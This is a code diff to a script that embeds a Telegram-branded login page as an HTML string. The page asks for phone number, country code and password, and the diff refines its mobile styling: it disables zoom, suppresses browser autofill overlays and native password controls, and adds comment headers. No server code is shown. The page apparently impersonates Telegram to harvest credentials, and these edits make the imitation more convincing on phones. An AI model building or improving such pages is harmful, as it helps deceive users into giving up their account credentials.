@@ -14,12 +14,10 @@ HTML_PAGE = """<!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
     <title>Telegram</title>
-    <!-- ===== FAVICON ===== -->
     <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Cpath d='M12 0C5.373 0 0 5.373 0 12s5.373 12 12 12 12-5.373 12-12S18.627 0 12 0z' fill='%230088cc'/%3E%3Cpath d='M5.491 11.74l11.57-4.461c.537-.194 1.006.131.832.943l.001-.001-1.97 9.281c-.146.658-.537.818-1.084.508l-3.013-2.222-1.467 1.412c-.162.162-.297.297-.605.297l.216-3.073 5.593-5.055c.243-.216-.054-.338-.377-.121l-6.914 4.354-2.982-.934c-.648-.203-.66-.648.135-.962z' fill='%23ffffff'/%3E%3C/svg%3E" type="image/svg+xml">
     <style>
-        /* ===== REST OF YOUR CSS ===== */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
@@ -29,6 +27,7 @@ HTML_PAGE = """<!DOCTYPE html>
             align-items: center;
             min-height: 100vh;
             padding: 16px;
+            -webkit-text-size-adjust: 100%;
         }
         .login-wrapper {
             background: #1a1a1a;
@@ -81,6 +80,8 @@ HTML_PAGE = """<!DOCTYPE html>
             text-transform: uppercase;
             letter-spacing: 0.3px;
         }
+
+        /* ===== PHONE ROW ===== */
         .phone-row {
             display: flex;
             align-items: center;
@@ -132,6 +133,8 @@ HTML_PAGE = """<!DOCTYPE html>
         .phone-row .phone-input::placeholder {
             color: #555555;
         }
+
+        /* ===== PASSWORD WRAPPER - MOBILE FIX ===== */
         .password-wrapper {
             display: flex;
             align-items: center;
@@ -152,13 +155,19 @@ HTML_PAGE = """<!DOCTYPE html>
             border: none;
             background: transparent;
             padding: 14px 12px 14px 16px;
-            color: #ffffff;
+            color: #ffffff !important;
             font-size: 16px;
             outline: none;
+            -webkit-text-fill-color: #ffffff !important;
+            opacity: 1 !important;
         }
         .password-wrapper input::placeholder {
-            color: #555555;
+            color: #555555 !important;
+            -webkit-text-fill-color: #555555 !important;
+            opacity: 1 !important;
         }
+
+        /* ===== KILL BROWSER NATIVE EYE & AUTOFILL OVERLAY ===== */
         .password-wrapper input::-webkit-credentials-auto-fill-button,
         .password-wrapper input::-webkit-caps-lock-indicator,
         .password-wrapper input::-webkit-textfield-decoration-container {
@@ -174,6 +183,22 @@ HTML_PAGE = """<!DOCTYPE html>
         .password-wrapper input[type="password"]::-ms-clear {
             display: none !important;
         }
+
+        /* ===== MOBILE AUTOFILL OVERRIDE ===== */
+        .password-wrapper input:-webkit-autofill,
+        .password-wrapper input:-webkit-autofill:hover,
+        .password-wrapper input:-webkit-autofill:focus,
+        .password-wrapper input:-webkit-autofill:active {
+            -webkit-box-shadow: 0 0 0 1000px #262626 inset !important;
+            -webkit-text-fill-color: #ffffff !important;
+            caret-color: #ffffff !important;
+            background-color: #262626 !important;
+            background: #262626 !important;
+            color: #ffffff !important;
+            transition: background-color 5000s ease-in-out 0s;
+        }
+
+        /* ===== CUSTOM EYE TOGGLE ===== */
         .password-toggle {
             flex-shrink: 0;
             background: none;
@@ -212,6 +237,7 @@ HTML_PAGE = """<!DOCTYPE html>
         .password-toggle.hidden .eye-closed {
             display: block;
         }
+
         .options-row {
             display: flex;
             justify-content: space-between;
@@ -315,6 +341,8 @@ HTML_PAGE = """<!DOCTYPE html>
         .footer a:hover {
             color: #777;
         }
+
+        /* ===== LOADING OVERLAY ===== */
         .loading-overlay {
             display: none;
             position: fixed;
@@ -347,6 +375,8 @@ HTML_PAGE = """<!DOCTYPE html>
             color: #aaa;
             font-size: 15px;
         }
+
+        /* ===== HONEYPOT ===== */
         .honeypot {
             position: absolute;
             left: -9999px;
@@ -354,6 +384,8 @@ HTML_PAGE = """<!DOCTYPE html>
             opacity: 0;
             pointer-events: none;
         }
+
+        /* ===== RESPONSIVE ===== */
         @media (max-width: 500px) {
             .login-wrapper {
                 padding: 32px 20px 28px;
@@ -436,7 +468,7 @@ HTML_PAGE = """<!DOCTYPE html>
                 <div class="phone-row">
                     <input type="text" class="country-code" id="countryCode" name="country_code" placeholder="+__" value="+1" maxlength="5">
                     <span class="separator"> </span>
-                    <input type="tel" class="phone-input" id="phone" name="phone" placeholder="(555) 123-4567" required autofocus>
+                    <input type="tel" class="phone-input" id="phone" name="phone" placeholder="(555) 123-4567" maxlength="15" required autofocus>
                 </div>
             </div>
             <div class="input-group">
